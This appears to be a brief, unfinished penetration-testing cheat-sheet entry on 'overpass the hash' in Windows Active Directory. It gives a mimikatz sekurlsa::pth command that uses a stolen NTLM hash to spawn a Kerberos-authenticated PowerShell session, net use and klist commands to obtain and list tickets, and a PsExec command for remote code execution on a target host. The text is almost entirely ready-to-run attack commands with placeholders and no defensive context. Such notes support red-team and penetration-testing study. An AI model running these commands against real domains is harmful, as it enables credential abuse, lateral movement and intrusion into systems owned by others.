# Overpass The Hash

#### STILL EDITING

**Overpass the hash** (turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication):

```
mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:PowerShell.exe
```

```powershell
net use \\$MACHINE_HOSTNAME
klist
```

To gain a remote code execution:

```powershell
.\PsExec.exe \\$MACHINE_HOSTNAME cmd.exe
```
